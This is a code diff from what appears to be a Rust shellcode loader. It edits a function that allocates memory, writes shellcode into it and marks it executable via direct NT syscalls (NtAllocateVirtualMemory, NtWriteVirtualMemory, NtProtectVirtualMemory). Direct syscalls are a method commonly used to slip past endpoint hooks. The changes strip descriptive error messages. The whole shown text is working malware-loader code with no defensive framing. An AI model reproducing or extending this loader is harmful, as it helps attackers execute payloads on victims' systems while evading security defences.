@@ -1,8 +1,7 @@
 use rust_syscalls::syscall;
+
 // =======================================================================================================
-//
 // (DEFAULT) SHELLCODE EXECUTION USING NTWriteVritualMemory
-//
 // =======================================================================================================
 
 #[cfg(feature = "ShellcodeExecuteDefault")]
@@ -29,7 +28,6 @@ pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
         return_value = syscall!("NtAllocateVirtualMemory", process_handle, &mut base_address, 0, &mut region_size, allocation_type, 0x04);
     }
     if return_value != 0 {
-        println!("Failed to allocate memory, NtAllocateVirtualMemory");
         println!("{:x}", return_value);
         return false;
     }
@@ -39,7 +37,6 @@ pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
         return_value = syscall!("NtWriteVirtualMemory", process_handle, base_address, shellcode_ptr, bytes_to_load.len(), &mut bytes_written);
     }
     if return_value != 0 {
-        println!("Failed to write shellcode, NtWriteVirtualMemory");
         println!("{:x}", return_value);
         return false;
     }
@@ -50,7 +47,6 @@ pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool
         return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, 0x20, &mut oldprotect);
     }
     if return_value != 0 {
-        println!("Failed to reprotect memory, NtProtectVirtualMemory");
         println!("{:x}", return_value);
         return false;
     }
